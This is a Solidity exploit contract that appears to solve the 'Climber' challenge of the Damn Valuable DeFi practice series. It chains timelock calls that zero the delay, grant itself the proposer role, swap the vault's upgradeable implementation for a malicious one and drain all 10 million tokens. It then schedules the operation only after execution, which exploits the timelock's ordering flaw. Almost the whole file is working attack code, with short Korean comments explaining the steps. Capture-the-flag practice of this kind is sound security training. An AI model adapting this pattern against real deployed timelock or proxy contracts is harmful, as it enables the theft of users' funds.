pragma solidity ^0.8.22;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {MaliciousVault} from "./MaliciousVault.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Attack {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    MaliciousVault maliciousVault;
    address recovery;

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    bytes32 salt = bytes32(0);
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(address _timelock, address _vault, address _token, address _recovery) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack() external {
        maliciousVault = new MaliciousVault();

        targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(vault);
        targets[4] = address(this);

        values = new uint256[](5);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;

        dataElements = new bytes[](5);
        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0)); // delay 1hours -> 0
        dataElements[1] = abi.encodeCall(IAccessControl.grantRole, (PROPOSER_ROLE, address(this))); // PROPOSER_ROLE을 공격 컨트랙트에 부여
        dataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(maliciousVault), "")); // ClimberVault(proxy)의 구현체를 공격 컨트랙트로 교체
        dataElements[3] = abi.encodeCall(MaliciousVault.drain, (address(token), recovery, VAULT_TOKEN_BALANCE));
        dataElements[4] = abi.encodeCall(Attack.registerOperation, ());
        timelock.execute(targets, values, dataElements, salt);
    }

    function registerOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}